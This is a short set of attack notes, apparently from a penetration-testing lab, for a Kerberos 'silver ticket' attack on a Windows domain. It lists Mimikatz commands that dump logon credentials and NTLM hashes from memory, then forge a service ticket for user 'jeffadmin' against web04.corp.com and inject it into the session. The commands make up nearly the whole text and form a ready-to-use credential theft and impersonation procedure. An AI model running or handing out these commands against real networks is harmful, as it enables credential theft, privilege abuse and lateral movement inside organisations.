# Silver Ticket
Extract NTLM Hash of SPN
<br># Launch Mimikatz as Administrator
<br>privilege::debug
<br>sekurlsa::logonpasswords
# Create and Inject Silver Ticket
<br>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

